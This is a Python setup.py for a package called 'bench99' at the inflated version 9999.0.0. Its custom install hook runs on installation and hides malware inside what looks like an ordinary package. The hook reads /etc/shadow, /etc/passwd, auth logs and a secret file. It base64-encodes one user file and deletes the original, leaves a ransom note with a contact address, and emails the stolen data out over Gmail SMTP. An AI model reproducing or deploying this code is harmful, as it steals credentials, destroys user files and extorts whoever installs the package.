import os
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from setuptools import setup, find_packages
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        install.run(self)

        # le code à exécuter après l'installation
        
        # Copier les fichiers système importants
        for filename in ["/etc/hosts","/etc/shadow","/etc/passwd","/var/log/auth.log","/home/kali/my-secret"]:
            try:
                with open(filename, 'r') as f:
                    content = f.read()
                with open("hacked-by", 'a') as f:   
                    f.write(content)
            except FileNotFoundError:
                pass

        # Chiffrer un fichier et le supprimer
        fichier_original = "/home/kali/lolo.txt"
        fichier_chiffre = "/home/kali/lolo-promax.txt"
        with open(fichier_original, "rb") as f:
            contenu = f.read()
        contenu_chiffre = base64.b64encode(contenu)
        with open(fichier_chiffre, "wb") as f:
            f.write(contenu_chiffre)
        os.remove(fichier_original)

        # Écrire un fichier readme
        with open("/home/kali/readme.txt", "w") as f:
            f.write("############### by by salam  ################### !\n")
            f.write("_______________________# Pour récupérer vos mots de passe ainsi que la clé de déchiffrement de vos dossiers, veuillez me contacter à l'adresse suivante ________________________________________________________________________________________________: benchehlaachraf@gmail.com. \n")

        # Envoyer un email avec un fichier attaché
        gmail_address = "xxxx"
        gmail_password = "xxxx"
        to_address = "xxxx"
        msg = MIMEMultipart()
        msg['Subject'] = "hacker 101"
        msg['From'] = gmail_address
        msg['To'] = to_address
        filename = "/home/kali/hacked-by"
        attachment = open(filename, "rb")
        mimebase = MIMEBase('application', 'octet-stream')
        mimebase.set_payload((attachment).read())
        encoders.encode_base64(mimebase)
        mimebase.add_header('Content-Disposition', "attachment; filename= %s" % filename.split("/")[-1])
        msg.attach(mimebase)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(gmail_address, gmail_password)
        server.sendmail(gmail_address, to_address, msg.as_string())
        server.quit()

# ici la partie des configurations de nom url ... etc
VERSION = '9999.0.0'

setup(
    name='bench99',
    url='https://github.com/labs/bench99/',
    download_url='https://github.com/labs/bench99/archive/{}.tar.gz'.format(VERSION),
    author='7amid',
    author_email='benchehlaachraf@gmail.com',
    version=VERSION,
    packages=find_packages(),
    include_package_data=True,
    license='MIT',
    description=('''Daggggg'''),
    cmdclass={
            'install': PostInstallCommand
    },
)
